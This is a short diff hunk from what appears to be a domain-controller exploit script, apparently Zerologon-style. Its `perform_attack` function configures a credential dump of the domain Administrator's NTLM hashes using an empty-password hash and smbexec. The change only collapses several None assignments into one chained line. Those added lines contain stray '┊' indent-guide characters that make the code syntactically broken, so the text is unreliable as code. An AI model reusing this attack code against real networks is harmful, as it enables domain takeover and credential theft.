@@ -92,23 +92,16 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
         def __init__(self):
             self.use_vss = False
             self.target_ip = dc_ip
-            self.aesKey = None
-            self.system = None
-            self.bootkey = None
-            self.security = None
-            self.sam = None
-            self.ntds = None
-            self.history = None
             self.outputfile = './dumped.tmp'
-            self.k = None
             self.hashes = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
             self.exec_method = "smbexec"
             self.just_dc = True
             self.just_dc_ntlm = True
             self.just_dc_user = target_da
-            self.pwd_last_set = None
-            self.user_status = None
-            self.resumefile = None
+
+            self.pwd_last_set = self.user_status = self.resumefile = \
+            ┊   ┊   self.k = self.history = self.ntds = self.sam = self.security = \
+        ┊   ┊   ┊   self.system = self.aesKey = self.bootkey = None
             self.dc_ip = dc_ip
     class PSOptions:
         def __init__(self):
